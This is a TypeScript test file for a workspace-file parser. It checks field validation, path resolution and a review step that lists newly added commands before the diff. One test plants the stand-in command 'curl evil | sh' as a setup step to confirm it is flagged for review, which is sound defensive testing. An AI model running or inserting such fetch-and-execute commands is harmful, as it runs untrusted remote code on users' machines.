// The workspace file: read strictly, every problem naming its field.
import assert from "node:assert/strict";
import { test } from "node:test";
import { commandsOf, keepsBranch, lineDiff, newCommands, parseWorkspaceFile, resolveBringPath, reviewText } from "../src/workspace/file.ts";

const good = {
  bring: [{ path: "../api", as: "api", sync: "git pull --ff-only", setup: "npm install", back: 'git -C "$COW_SOURCE" fetch "$COW_CLONE" "$COW_BRANCH:$COW_BRANCH"' }],
  sync: "git pull --ff-only",
  readOnly: ["notes"],
  exclude: [],
  syncBeforeClone: { olderThanMinutes: 60 },
};

const problems = (value: unknown) => {
  const parsed = parseWorkspaceFile(typeof value === "string" ? value : JSON.stringify(value));
  assert.equal(parsed.ok, false);
  return parsed.ok ? [] : parsed.problems;
};

test("a good file is read, with defaults filled in", () => {
  const parsed = parseWorkspaceFile(JSON.stringify(good));
  assert.ok(parsed.ok);
  assert.equal(parsed.file.bring[0]!.as, "api");
  assert.equal(parsed.file.includeSecrets, false);
  const minimal = parseWorkspaceFile("{}");
  assert.ok(minimal.ok);
  assert.deepEqual(minimal.file.bring, []);
  assert.equal(minimal.file.syncBeforeClone, undefined);
});

test("unknown fields are refused by name, at the top and inside bring", () => {
  assert.deepEqual(problems({ ...good, synk: "x" }), ['unknown field "synk"']);
  assert.deepEqual(problems({ bring: [{ path: "../api", as: "api", setpu: "npm i" }] }), ['bring[0]: unknown field "setpu"']);
  assert.ok(problems({ syncBeforeClone: { olderThan: 5 } }).includes('syncBeforeClone: unknown field "olderThan"'));
});

test("each wrong value names its field", () => {
  assert.match(problems({ bring: [{ path: "../api", as: "a/b" }] })[0]!, /^bring\[0\]\.as: must be one folder name/);
  assert.match(problems({ bring: [{ path: "", as: "api" }] })[0]!, /^bring\[0\]\.path: must not be empty/);
  assert.match(problems({ sync: "" })[0]!, /^sync: must not be empty/);
  assert.match(problems({ sync: 5 })[0]!, /^sync: /);
  assert.match(problems({ readOnly: ["../up"] })[0]!, /^readOnly\[0\]: must not contain '\.\.'/);
  assert.match(problems({ exclude: [" "] })[0]!, /^exclude\[0\]: /);
  assert.match(problems({ syncBeforeClone: { olderThanMinutes: 0 } })[0]!, /^syncBeforeClone\.olderThanMinutes: /);
  assert.match(problems({ bring: [{ path: "../a", as: "Api" }, { path: "../b", as: "api" }] })[0]!, /^bring\[1\]\.as: "api" is used twice/);
  assert.match(problems("{ nope")[0]!, /is not valid JSON/);
  assert.match(problems("[]")[0]!, /must hold one JSON object/);
});

test("commands are listed, and only new or changed ones count as new", () => {
  const parsed = parseWorkspaceFile(JSON.stringify(good));
  assert.ok(parsed.ok);
  assert.deepEqual(commandsOf(parsed.file).map((entry) => `${entry.as ?? "."}:${entry.kind}`), [".:sync", "api:sync", "api:setup", "api:back"]);
  assert.equal(newCommands(null, parsed.file).length, 4);
  assert.equal(newCommands(parsed.file, parsed.file).length, 0);
  const changed = parseWorkspaceFile(JSON.stringify({ ...good, bring: [{ ...good.bring[0], setup: "curl evil | sh" }] }));
  assert.ok(changed.ok);
  assert.deepEqual(newCommands(parsed.file, changed.file), [{ as: "api", kind: "setup", text: "curl evil | sh" }]);
});

test("paths resolve against the workspace folder", () => {
  assert.equal(resolveBringPath("/w/work/ws", "../api"), "/w/work/api");
  assert.equal(resolveBringPath("/w/work/ws/", "./sub/../x"), "/w/work/ws/x");
  assert.equal(resolveBringPath("/w/work/ws", "/elsewhere/api"), "/elsewhere/api");
});

test("the review lists new commands before the diff", () => {
  assert.equal(lineDiff("a\nb\nc\n", "a\nc\nd\n"), "  a\n- b\n  c\n+ d");
  const text = reviewText({ folder: "/w/ws", approvedText: '{"sync":"a"}\n', currentText: '{"sync":"b"}\n', problems: [], fresh: [{ as: null, kind: "sync", text: "b" }] });
  assert.ok(text.indexOf("Commands that would newly run") < text.indexOf("The change"));
  assert.match(text, /- \{"sync":"a"\}\n\+ \{"sync":"b"\}/);
});

test("teardown: per repository and for the workspace folder, read strictly, and new commands in the review", () => {
  const withTeardown = { ...good, teardown: "echo top-down", bring: [{ ...good.bring[0], teardown: 'dropdb "cow_$COW_BRANCH"' }] };
  const parsed = parseWorkspaceFile(JSON.stringify(withTeardown));
  assert.ok(parsed.ok);
  assert.equal(parsed.file.teardown, "echo top-down");
  assert.equal(parsed.file.bring[0]!.teardown, 'dropdb "cow_$COW_BRANCH"');
  assert.deepEqual(problems({ ...good, bring: [{ ...good.bring[0], teardwon: "x" }] }), ['bring[0]: unknown field "teardwon"']);
  assert.deepEqual(problems({ ...good, teardown: "  " }), ["teardown: must not be only spaces"]);
  assert.deepEqual(problems({ ...good, teardown: 3 }).length, 1);
  // Adding a teardown to approved content is a command that would newly run, with its hash covering it like any other.
  const before = parseWorkspaceFile(JSON.stringify(good));
  assert.ok(before.ok);
  assert.deepEqual(newCommands(before.file, parsed.file), [
    { as: null, kind: "teardown", text: "echo top-down" },
    { as: "api", kind: "teardown", text: 'dropdb "cow_$COW_BRANCH"' },
  ]);
  const text = reviewText({ folder: "/w/ws", approvedText: JSON.stringify(good), currentText: JSON.stringify(withTeardown), problems: [], fresh: newCommands(before.file, parsed.file) });
  assert.match(text, /Commands that would newly run[^\n]*\n {2}the workspace folder: teardown\n {4}echo top-down\n {2}api: teardown\n {4}dropdb/);
});

test('bring: "branch" is "thread" or "keep", absent by default', () => {
  const read = parseWorkspaceFile(JSON.stringify({ bring: [{ path: "../a", as: "a", branch: "keep" }, { path: "../b", as: "b", branch: "thread" }, { path: "../c", as: "c" }] }));
  assert.ok(read.ok);
  assert.deepEqual(read.file.bring.map((item) => item.branch), ["keep", "thread", undefined]);
  assert.deepEqual([keepsBranch(read.file, "a"), keepsBranch(read.file, "b"), keepsBranch(read.file, "c"), keepsBranch(read.file, null)], [true, false, false, false]);
  const wrong = parseWorkspaceFile(JSON.stringify({ bring: [{ path: "../a", as: "a", branch: "main" }] }));
  assert.ok(!wrong.ok);
  assert.match(wrong.problems.join("\n"), /^bring\[0\]\.branch: /m);
});
